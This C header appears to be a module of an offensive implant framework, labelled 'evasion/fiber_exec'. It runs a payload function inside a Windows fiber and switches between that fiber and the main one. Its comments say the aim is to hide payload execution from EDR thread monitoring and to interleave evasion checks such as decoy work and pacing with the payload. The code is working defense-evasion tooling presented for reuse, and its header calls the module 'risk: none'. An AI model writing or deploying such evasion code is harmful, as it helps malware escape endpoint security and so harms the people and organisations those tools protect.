// chunk: evasion/fiber_exec
// depends: (none)
// provides: fiber_exec_init, fiber_run_func
// risk: none
// note: Fiber-based execution — converts thread to fiber, creates payload fiber,
//       switches between them. EDR thread-level monitoring doesn't track fiber
//       switches (SwitchToFiber is a usermode-only context swap with no kernel
//       transition). Payload runs in a fiber context that doesn't appear in
//       standard thread enumeration. Also useful for cooperative multitasking
//       between evasion and payload code.

#ifndef CHUNK_FIBER_EXEC
#define CHUNK_FIBER_EXEC

#include <windows.h>

typedef struct _FIBER_CTX {
    PVOID main_fiber;
    PVOID payload_fiber;
    PVOID func;
    PVOID arg;
    DWORD result;
    BOOL done;
} FIBER_CTX;

static FIBER_CTX _fctx = {0};

static VOID CALLBACK _fiber_payload_proc(PVOID param) {
    FIBER_CTX *ctx = (FIBER_CTX *)param;

    typedef DWORD (*payload_fn)(PVOID);
    ctx->result = ((payload_fn)ctx->func)(ctx->arg);
    ctx->done = TRUE;

    /* Switch back to main fiber when payload completes */
    SwitchToFiber(ctx->main_fiber);
}

static int fiber_exec_init(void) {
    _fctx.main_fiber = ConvertThreadToFiber(NULL);
    if (!_fctx.main_fiber) {
        /* Thread may already be a fiber */
        _fctx.main_fiber = GetCurrentFiber();
        if (!_fctx.main_fiber || _fctx.main_fiber == (PVOID)0x1E00)
            return 0;
    }
    return 1;
}

/*
 * fiber_run_func: Execute a function in a fiber context.
 * The function runs outside normal thread scheduling — fiber switches
 * are invisible to kernel-level thread monitoring.
 *
 * func signature: DWORD func(PVOID arg)
 * Returns the function's return value.
 */
static DWORD fiber_run_func(PVOID func, PVOID arg) {
    if (!_fctx.main_fiber && !fiber_exec_init())
        return 0;

    _fctx.func = func;
    _fctx.arg = arg;
    _fctx.done = FALSE;
    _fctx.result = 0;

    _fctx.payload_fiber = CreateFiber(0, _fiber_payload_proc, &_fctx);
    if (!_fctx.payload_fiber)
        return 0;

    SwitchToFiber(_fctx.payload_fiber);

    /* We're back — payload completed */
    DeleteFiber(_fctx.payload_fiber);
    _fctx.payload_fiber = NULL;

    return _fctx.result;
}

/*
 * fiber_yield: Call from within a fiber payload to yield back to main.
 * Allows interleaving evasion checks (decoy work, pacing) with payload.
 */
static void fiber_yield(void) {
    if (_fctx.main_fiber)
        SwitchToFiber(_fctx.main_fiber);
}

/*
 * fiber_resume: Call from main fiber to resume payload fiber.
 */
static void fiber_resume(void) {
    if (_fctx.payload_fiber && !_fctx.done)
        SwitchToFiber(_fctx.payload_fiber);
}

#endif
